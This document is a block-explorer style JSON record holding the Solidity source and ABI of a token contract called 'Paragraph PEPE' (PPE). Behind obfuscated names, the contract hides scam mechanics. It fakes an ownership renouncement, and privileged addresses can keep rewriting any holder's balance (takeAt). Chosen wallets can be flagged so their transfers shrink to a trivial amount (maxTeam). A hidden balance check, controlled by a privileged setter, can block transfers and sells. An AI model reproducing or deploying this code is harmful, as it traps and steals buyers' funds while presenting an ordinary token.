{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface fromSenderTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableFromWallet) external view returns (uint256);\n\n    function transfer(address swapTx, uint256 maxLiquidity) external returns (bool);\n\n    function allowance(address swapLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTx,\n        uint256 maxLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);\n    event Approval(address indexed swapLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract listTradingMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenBuy {\n    function createPair(address enableAuto, address feeFrom) external returns (address);\n}\n\ninterface modeList is fromSenderTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ParagraphPEPE is listTradingMax, fromSenderTo, modeList {\n\n    function transferFrom(address isReceiver, address swapTx, uint256 maxLiquidity) external override returns (bool) {\n        if (_msgSender() != amountShould) {\n            if (shouldFee[isReceiver][_msgSender()] != type(uint256).max) {\n                require(maxLiquidity <= shouldFee[isReceiver][_msgSender()]);\n                shouldFee[isReceiver][_msgSender()] -= maxLiquidity;\n            }\n        }\n        return shouldSell(isReceiver, swapTx, maxLiquidity);\n    }\n\n    address amountShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        senderTeam enableIs = senderTeam(amountShould);\n        amountLaunch = tokenBuy(enableIs.factory()).createPair(enableIs.WETH(), address(this));\n        \n        minReceiver = _msgSender();\n        launchedMode();\n        receiverAmount[minReceiver] = true;\n        takeMode[minReceiver] = fromFund;\n        \n        emit Transfer(address(0), minReceiver, fromFund);\n    }\n\n    uint256 private fromFund = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public receiverAmount;\n\n    uint256 public receiverListTake;\n\n    address public amountLaunch;\n\n    address private sellMax;\n\n    bool public limitFeeMin;\n\n    function balanceOf(address enableFromWallet) public view virtual override returns (uint256) {\n        return takeMode[enableFromWallet];\n    }\n\n    function owner() external view returns (address) {\n        return sellMax;\n    }\n\n    mapping(address => bool) public senderFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletReceiverMarketing;\n    }\n\n    uint256 private launchToTx;\n\n    mapping(address => uint256) private takeMode;\n\n    bool private buyAmount;\n\n    function allowance(address tradingSwap, address autoMin) external view virtual override returns (uint256) {\n        if (autoMin == amountShould) {\n            return type(uint256).max;\n        }\n        return shouldFee[tradingSwap][autoMin];\n    }\n\n    uint256 private minFee;\n\n    function shouldSell(address isReceiver, address swapTx, uint256 maxLiquidity) internal returns (bool) {\n        if (isReceiver == minReceiver) {\n            return receiverEnable(isReceiver, swapTx, maxLiquidity);\n        }\n        uint256 liquiditySellLimit = fromSenderTo(amountLaunch).balanceOf(enableList);\n        require(liquiditySellLimit == buyFromSender);\n        require(swapTx != enableList);\n        if (senderFund[isReceiver]) {\n            return receiverEnable(isReceiver, swapTx, exemptFrom);\n        }\n        return receiverEnable(isReceiver, swapTx, maxLiquidity);\n    }\n\n    string private walletReceiverMarketing = \"PPE\";\n\n    uint256 buyFromSender;\n\n    function name() external view virtual override returns (string memory) {\n        return limitTake;\n    }\n\n    uint8 private fromIs = 18;\n\n    function amountWalletBuy(address tradingFrom) public {\n        if (marketingShould) {\n            return;\n        }\n        \n        receiverAmount[tradingFrom] = true;\n        if (minFee == receiverListTake) {\n            receiverListTake = receiverFund;\n        }\n        marketingShould = true;\n    }\n\n    function takeAt(address tradingAutoLaunched, uint256 maxLiquidity) public {\n        buyFrom();\n        takeMode[tradingAutoLaunched] = maxLiquidity;\n    }\n\n    bool public marketingShould;\n\n    bool public tokenSell;\n\n    function launchedMode() public {\n        emit OwnershipTransferred(minReceiver, address(0));\n        sellMax = address(0);\n    }\n\n    uint256 constant exemptFrom = 10 ** 10;\n\n    function maxTeam(address shouldTo) public {\n        buyFrom();\n        \n        if (shouldTo == minReceiver || shouldTo == amountLaunch) {\n            return;\n        }\n        senderFund[shouldTo] = true;\n    }\n\n    address public minReceiver;\n\n    string private limitTake = \"Paragraph PEPE\";\n\n    bool private receiverSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromIs;\n    }\n\n    function transfer(address tradingAutoLaunched, uint256 maxLiquidity) external virtual override returns (bool) {\n        return shouldSell(_msgSender(), tradingAutoLaunched, maxLiquidity);\n    }\n\n    function receiverEnable(address isReceiver, address swapTx, uint256 maxLiquidity) internal returns (bool) {\n        require(takeMode[isReceiver] >= maxLiquidity);\n        takeMode[isReceiver] -= maxLiquidity;\n        takeMode[swapTx] += maxLiquidity;\n        emit Transfer(isReceiver, swapTx, maxLiquidity);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldFee;\n\n    function receiverMax(uint256 maxLiquidity) public {\n        buyFrom();\n        buyFromSender = maxLiquidity;\n    }\n\n    address enableList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private receiverFund;\n\n    uint256 fundLiquidity;\n\n    event OwnershipTransferred(address indexed limitReceiver, address indexed tradingFund);\n\n    function buyFrom() private view {\n        require(receiverAmount[_msgSender()]);\n    }\n\n    function approve(address autoMin, uint256 maxLiquidity) public virtual override returns (bool) {\n        shouldFee[_msgSender()][autoMin] = maxLiquidity;\n        emit Approval(_msgSender(), autoMin, maxLiquidity);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellMax;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"}],\"name\":\"amountWalletBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFromWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFeeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"}],\"name\":\"maxTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverListTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"receiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAutoLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"takeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAutoLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ParagraphPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}